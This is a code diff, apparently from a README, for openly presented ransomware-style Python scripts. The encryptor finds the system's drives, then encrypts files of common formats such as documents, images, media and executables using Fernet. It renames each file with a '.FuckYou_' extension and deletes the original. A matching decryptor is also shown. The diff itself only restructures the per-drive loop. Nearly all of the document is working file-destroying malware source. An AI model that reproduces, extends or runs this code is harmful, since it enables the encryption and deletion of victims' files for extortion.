@@ -17,34 +17,35 @@ keyCode = str(key).replace("b","",1).replace("'","",2)
 print (f"This is your key {keyCode}")
 #### Finding System Drives ####
 Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\","").split()
-#### Removing C Drive ####
+### Removing C Drive ####
 if "C:" in Drives:
     Drives.remove("C:")
+Drives = ["E:","K:"]
 #### fileFormats ####
 fileFormats = ["psd","py","txt","mp4","exe","jpg","pdf","mp3"]
 ######################################################
 #################### Encrypting Files ################
-def Encrypt():
+def Encrypt(drive):
     for Formatt in fileFormats:
         try:
-            for drive in Drives:
-                with open("log.txt" , "w") as errorlog: 
-                    cmd = check_output(drive+" && dir /S /B *."+Formatt , shell=True , stderr=errorlog).decode().replace("\r","").split("\n")
-                    for file in cmd:
-                        with open(file,"rb") as readfile:
-                            data = readfile.read()
-                            encData = encriptt.encrypt(data) #mani.FuckYou_txt
-                            newFile = open(file.replace("."+Formatt,"")+".FuckYou"+"_"+Formatt,"wb")
-                            newFile.write(encData)
-                            readfile.close()
-                            newFile.close()
-                            os.remove(file)
-                            print (f"{file} | Encrypted .")
+            with open("log.txt" , "w") as errorlog: 
+                cmd = check_output(drive+" && dir /S /B *."+Formatt , shell=True , stderr=errorlog).decode().replace("\r","").split("\n")
+                for file in cmd:
+                    with open(file,"rb") as readfile:
+                        data = readfile.read()
+                        encData = encriptt.encrypt(data) #mani.FuckYou_txt
+                        newFile = open(file.replace("."+Formatt,"")+".FuckYou"+"_"+Formatt,"wb")
+                        newFile.write(encData)
+                        readfile.close()
+                        newFile.close()
+                        os.remove(file)
+                        print (f"{file} | Encrypted .")
         except:
             pass
 
 if __name__ == "__main__":
-    Encrypt()
+    for drive in Drives:
+        Encrypt(drive)
 ```
 ## ```Decryption```
 ```python
@@ -60,32 +61,33 @@ encriptt = Fernet(key)
 Drives = getoutput("fsutil fsInfo drives").replace("Drives:","").replace("\\","").split()
 if "C:" in Drives:
     Drives.remove("C:")
+Drives = ["E:","K:"]
 #### File Formats ####
 fileFormats = ["psd","py","txt","mp4","exe","jpg","pdf","mp3"]
 #####################################################
 #################### Decrypting Files ###############
-def Decrypt():
+def Decrypt(drive):
     for Formatt in fileFormats:
         try:
-            for drive in Drives:
-                with open("log.txt" , "w") as errorlog:
-                    cmd = check_output(drive+" && dir /S /B *.FuckYou_"+Formatt , shell=True , stderr=errorlog).decode().replace("\r","").split("\n")
-                    for file in cmd:
-                        with open(file,"rb") as readfile:
-                            data = readfile.read()
-                            encData = encriptt.decrypt(data)
-                            nameOfFile = file.replace(".FuckYou_"+Formatt,"")
-                            newFile = open(nameOfFile+"."+Formatt,"wb")
-                            newFile.write(encData)
-                            readfile.close()
-                            newFile.close()
-                            os.remove(file)
-                            print (f"{file} | Decrypted .")
+            with open("log.txt" , "w") as errorlog:
+                cmd = check_output(drive+" && dir /S /B *.FuckYou_"+Formatt , shell=True , stderr=errorlog).decode().replace("\r","").split("\n")
+                for file in cmd:
+                    with open(file,"rb") as readfile:
+                        data = readfile.read()
+                        encData = encriptt.decrypt(data)
+                        nameOfFile = file.replace(".FuckYou_"+Formatt,"")
+                        newFile = open(nameOfFile+"."+Formatt,"wb")
+                        newFile.write(encData)
+                        readfile.close()
+                        newFile.close()
+                        os.remove(file)
+                        print (f"{file} | Decrypted .")
         except:
             pass
 
 if __name__ == "__main__":
-    Decrypt()
+    for drive in Drives:
+        Decrypt(drive)
 ```
 
 ## ```Modules```
